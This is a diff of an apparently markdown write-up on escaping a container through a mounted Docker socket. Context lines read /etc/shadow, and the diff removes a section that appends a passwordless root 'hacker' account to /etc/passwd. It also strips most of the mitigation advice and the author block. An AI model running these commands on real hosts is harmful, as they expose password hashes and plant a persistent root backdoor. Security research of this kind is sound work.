@@ -54,11 +54,6 @@ ls /root
 cat /etc/shadow
 ```
 
-## 🕵️ Optional: Add a Backdoor User
-
-```bash
-echo 'hacker::0:0:Hacker:/root:/bin/bash' >> /etc/passwd
-```
 
 ## 📉 Impact
 
@@ -71,17 +66,6 @@ echo 'hacker::0:0:Hacker:/root:/bin/bash' >> /etc/passwd
 ## 🛡️ Mitigation
 
 - ❌ Do NOT mount `/var/run/docker.sock` into untrusted containers
-- ✅ Use alternatives like:
-  - Kaniko
-  - BuildKit
-- ✅ Use rootless Docker
-- ✅ Enforce security policies with AppArmor, SELinux, seccomp
-- ✅ Audit Docker usage with tools like Falco, AuditD
-
-## 🧠 Author
-
-**@yourname**  
-Security Researcher | DevSecOps | Threat Hunter
 
 ## ⚠️ Disclaimer
 
